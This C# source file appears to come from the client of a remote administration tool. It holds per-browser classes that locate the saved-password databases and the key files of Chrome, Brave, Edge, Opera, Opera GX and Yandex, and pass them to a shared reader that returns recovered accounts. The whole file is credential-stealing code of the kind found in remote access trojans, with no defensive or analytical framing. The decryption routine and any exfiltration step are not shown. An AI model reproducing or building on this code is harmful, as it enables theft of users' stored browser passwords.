using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    // ============================================================================
    // CHROME
    // ============================================================================
    public class ChromePassReader : ChromiumBase
    {
        public override string ApplicationName => "Chrome";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Chrome: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }

    // ============================================================================
    // BRAVE
    // ============================================================================
    public class BravePassReader : ChromiumBase
    {
        public override string ApplicationName => "Brave";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Brave: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }

    // ============================================================================
    // MICROSOFT EDGE
    // ============================================================================
    public class EdgePassReader : ChromiumBase
    {
        public override string ApplicationName => "Microsoft Edge";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Edge\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Edge: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }

    // ============================================================================
    // OPERA
    // ============================================================================
    public class OperaPassReader : ChromiumBase
    {
        public override string ApplicationName => "Opera";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Opera: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }

    // ============================================================================
    // OPERA GX
    // ============================================================================
    public class OperaGXPassReader : ChromiumBase
    {
        public override string ApplicationName => "Opera GX";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera GX Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"OperaGX: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }

    // ============================================================================
    // YANDEX
    // ============================================================================
    public class YandexPassReader : ChromiumBase
    {
        public override string ApplicationName => "Yandex";

        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Yandex: Error - {ex.Message}");
                return new List<RecoveredAccount>();
            }
        }
    }
}